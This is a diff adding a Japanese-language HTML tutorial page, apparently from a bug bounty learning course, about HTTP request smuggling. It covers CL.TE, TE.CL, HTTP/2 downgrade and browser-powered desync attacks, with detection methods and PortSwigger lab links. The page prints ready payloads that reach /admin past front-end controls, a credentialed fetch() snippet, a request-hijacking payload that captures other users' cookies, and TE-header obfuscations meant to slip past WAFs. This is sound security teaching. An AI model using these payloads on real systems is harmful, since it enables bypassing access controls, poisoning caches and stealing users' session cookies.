@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTTP Request Smuggling - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+        .smuggle-diagram { background: var(--surface-raised); border: 1px solid var(--border); border-radius: 8px; padding: 1.2rem; margin: 1rem 0; font-family: 'Cascadia Code', monospace; font-size: 0.78rem; line-height: 1.7; overflow-x: auto; white-space: pre; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 4: Advanced &gt; HTTP Request Smuggling
+        </div>
+
+        <div class="page-header">
+            <h1>HTTP Request Smuggling</h1>
+            <p class="subtitle">
+                Front-endとBack-endのHTTPパーサー差異を悪用し、リクエスト境界を操作する。
+                セキュリティ制御bypass、cache poisoning、credential窃取に直結するExpert-level攻撃。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-handson">Hands-on</span>
+                <span class="tag tag-wsa">WSA Labs</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Core Concept</h2>
+            <p>
+                HTTP Request Smugglingは、Front-end (CDN/Load Balancer/WAF) と
+                Back-end (Application Server) がリクエストの境界を異なる方法で解釈する場合に発生する。
+            </p>
+
+            <h3>リクエスト境界の決定方法</h3>
+            <table>
+                <thead>
+                    <tr><th>Method</th><th>Header</th><th>Mechanism</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Content-Length (CL)</td><td><code>Content-Length: 13</code></td><td>ボディのバイト数を明示指定</td></tr>
+                    <tr><td>Transfer-Encoding (TE)</td><td><code>Transfer-Encoding: chunked</code></td><td>チャンク終端 (0\r\n\r\n) でbody終了</td></tr>
+                </tbody>
+            </table>
+
+            <div class="callout danger">
+                <div class="callout-title">根本原因</div>
+                <p>
+                    RFC 7230: CL と TE が両方存在する場合 TE を優先すべき。
+                    しかし実装の不整合により、一方がCLを使い、もう一方がTEを使う状況が生まれる。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>CL.TE Attack</h2>
+            <p>Front-end: Content-Length使用、Back-end: Transfer-Encoding使用</p>
+
+            <div class="smuggle-diagram">Front-end sees (via Content-Length: 13):
+┌──────────────────────────────────┐
+│ POST / HTTP/1.1                  │
+│ Host: target.com                 │
+│ Content-Length: 13               │  ← Front uses this
+│ Transfer-Encoding: chunked       │
+│                                  │
+│ 0\r\n                            │
+│ \r\n                             │
+│ SMUGGLED                         │  ← "13 bytes of body" for front-end
+└──────────────────────────────────┘
+                                        Front-end forwards ALL to backend
+
+Back-end sees (via Transfer-Encoding: chunked):
+┌─────────────────────┐  ┌────────────────────────┐
+│ POST / HTTP/1.1     │  │ SMUGGLED...            │
+│ ...                 │  │ (interpreted as START  │
+│ Body: "0\r\n\r\n"  │  │  of NEXT request!)     │
+│ (chunk terminated)  │  │                        │
+└─────────────────────┘  └────────────────────────┘
+      Request 1               "Request 2" (smuggled)</div>
+
+            <h3>Exploit Example</h3>
+            <pre><code>POST / HTTP/1.1
+Host: target.com
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X</code></pre>
+            <p>Back-endは <code>0\r\n\r\n</code> で最初のリクエスト終了と判断し、
+            <code>GET /admin</code> を次のリクエストとして処理する。</p>
+        </div>
+
+        <div class="section">
+            <h2>TE.CL Attack</h2>
+            <p>Front-end: Transfer-Encoding使用、Back-end: Content-Length使用</p>
+
+            <pre><code>POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+</code></pre>
+            <p>Front-endはchunkedを見て全体を1リクエストとして転送。
+            Back-endはCL:4を見て最初の4バイトでリクエスト1終了、残りが次のリクエストに。</p>
+        </div>
+
+        <div class="section">
+            <h2>H2.CL (HTTP/2 Downgrade)</h2>
+            <p>
+                HTTP/2では本来Content-Lengthは不要(フレームで長さが決まる)。
+                しかしfront-endがHTTP/2→HTTP/1.1ダウングレードする際、
+                攻撃者が指定したContent-Lengthヘッダーがそのまま渡されることがある。
+            </p>
+
+            <pre><code># HTTP/2 request (pseudo-headers)
+:method: POST
+:path: /
+:authority: target.com
+content-length: 0
+
+# HTTP/2 DATA frame contains:
+GET /admin HTTP/1.1\r\n
+Host: target.com\r\n
+\r\n
+
+# Front-end downgrades to HTTP/1.1:
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 0    ← From H2 header (body=0 bytes)
+                     ← But actual body data was sent in DATA frame!
+GET /admin HTTP/1.1  ← Backend sees this as next request</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">HTTP/2 Smugglingの利点</div>
+                <p>
+                    Front-end proxyがCL/TE conflictを検知するWAFルールを実装していても、
+                    HTTP/2段階ではCL/TEの概念が異なるため検知をbypassしやすい。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Browser-Powered Desync (Client-Side Desync)</h2>
+            <p>
+                被害者のブラウザ自体にdesyncを起こさせる新しいカテゴリ。
+                攻撃者のページからvictimのブラウザ経由で対象サイトに不正リクエストを送信。
+            </p>
+
+            <h3>Attack Flow</h3>
+            <ol>
+                <li>攻撃者ページがvictimのブラウザにfetch()を実行させる</li>
+                <li>CL不一致でブラウザ-サーバ間のTCP接続にpoisonデータが残る</li>
+                <li>ブラウザの次のリクエストがpoisonデータに連結される</li>
+                <li>結果: victimのcookieが攻撃者に送信される等</li>
+            </ol>
+
+            <pre><code>// Attacker's page
+fetch('https://target.com/api', {
+  method: 'POST',
+  body: 'GET /redirect-to-evil HTTP/1.1\r\nFoo: bar',
+  headers: { 'Content-Length': '0' },  // Browser sends body but says CL:0
+  mode: 'no-cors',
+  credentials: 'include'
+});
+// Next navigation to target.com uses same TCP connection → smuggled request activates</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Impact Scenarios</h2>
+
+            <h3>1. Bypass Security Controls</h3>
+            <pre><code># WAF blocks /admin for external users
+# Smuggled request appears to come from internal (same TCP connection)
+GET /admin HTTP/1.1
+Host: target.com
+# → WAF never sees this request (it's embedded in previous request's body)</code></pre>
+
+            <h3>2. Web Cache Poisoning</h3>
+            <pre><code># Poison cache by smuggling response for different URL
+# Smuggled: GET /static/main.js
+# Response: attacker-controlled JS
+# → Cached under /static/main.js → all users get malicious JS</code></pre>
+
+            <h3>3. Credential Theft (Request Hijacking)</h3>
+            <pre><code># Smuggle a partial request that "captures" the next user's request
+POST /log HTTP/1.1
+Content-Length: 999
+
+data=
+# Next user's full request (including cookies) becomes the body of this POST
+# → Stored in application log accessible to attacker</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Detection Techniques</h2>
+
+            <h3>Timing-Based Detection</h3>
+            <pre><code># CL.TE detection: send ambiguous request with delay
+# If back-end uses TE → processes chunk immediately
+# If back-end uses CL → waits for more data → TIMEOUT
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+# If response delayed → CL.TE likely (back-end waiting for 6 bytes via CL)</code></pre>
+
+            <h3>Differential Response Detection</h3>
+            <pre><code># Send smuggle probe, then immediately send normal request
+# If smuggling works: normal request gets unexpected response (404, redirect, etc.)
+# Compare: normal response vs post-smuggle response</code></pre>
+
+            <h3>TE Obfuscation Techniques</h3>
+            <pre><code># When front-end validates TE header, try obfuscation:
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked       (space before colon)
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-encoding: chunked        (lowercase)
+Transfer-Encoding:
+ chunked                           (line folding)
+X: x\nTransfer-Encoding: chunked  (header injection)</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Tools</h2>
+            <table>
+                <thead>
+                    <tr><th>Tool</th><th>Purpose</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>HTTP Request Smuggler (Burp)</td><td>Automated smuggling detection</td></tr>
+                    <tr><td>smuggler.py</td><td>CLI detection tool</td></tr>
+                    <tr><td>h2csmuggler</td><td>HTTP/2 cleartext smuggling</td></tr>
+                    <tr><td>Burp Repeater (HTTP/2 mode)</td><td>Manual H2 smuggling tests</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>WSA Labs</h2>
+            <div class="card">
+                <div class="card-title">PortSwigger Web Security Academy (Expert Level)</div>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank">HTTP request smuggling</a></li>
+                    <li>Lab: HTTP request smuggling, basic CL.TE vulnerability</li>
+                    <li>Lab: HTTP request smuggling, basic TE.CL vulnerability</li>
+                    <li>Lab: HTTP request smuggling, obfuscating the TE header</li>
+                    <li>Lab: Exploiting HTTP request smuggling to bypass front-end security controls (CL.TE / TE.CL)</li>
+                    <li>Lab: Exploiting HTTP request smuggling to capture other users' requests</li>
+                    <li>Lab: H2.CL request smuggling</li>
+                    <li>Lab: Response queue poisoning via H2.TE request smuggling</li>
+                    <li>Lab: Browser-powered request smuggling via CSD</li>
+                </ul>
+            </div>
+
+            <div class="callout warning">
+                <div class="callout-title">Expert Labs</div>
+                <p>
+                    Request Smugglingは WSA の中でも Expert difficulty に位置する。
+                    先にCL/TEの基本的な挙動を理解してからLabに取り組むこと。
+                    PortSwigger Research blogのJames Kettleの記事が前提知識として必須。
+                </p>
+            </div>
+        </div>
+
+        <div class="page-nav">
+            <a href="45-cache-poisoning.html">&larr; Prev: Cache Poisoning</a>
+            <a href="47-prototype-pollution.html">Next: Prototype Pollution &rarr;</a>
+        </div>
+
+        <div style="margin-top:2rem; text-align:center;">
+            <button class="complete-btn" data-module-id="46-smuggle" onclick="toggleComplete('46-smuggle')">Mark Complete</button>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
